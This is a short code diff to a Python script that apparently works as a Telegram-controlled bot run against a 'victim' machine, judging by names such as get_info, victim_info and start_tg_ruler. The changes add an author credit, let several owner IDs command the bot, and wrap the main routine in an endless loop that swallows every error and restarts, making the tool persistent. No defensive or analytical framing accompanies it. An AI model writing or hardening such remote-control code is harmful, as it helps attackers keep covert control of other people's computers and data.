@@ -1,3 +1,6 @@
+# made by gentlemanrc
+# v. 1.1
+
 import os
 import sys
 import time
@@ -41,7 +44,7 @@ def get_info():
     return victim_info
 
 def check_bot_owner(id):
-    if id == config.BOT_OWNER_ID:
+    if id in config.BOT_OWNER_ID:
         return True
     else:
         return False
@@ -84,9 +87,8 @@ def main():
     start_tg_ruler()
 
 if __name__ == '__main__':
-    try: main()
-    except Exception as e:
-        print(e)
-        time.sleep(60)
-        try: main()
-        except Exception: exit()
+    while (True):
+        try:
+            main()
+        except Exception:
+            continue
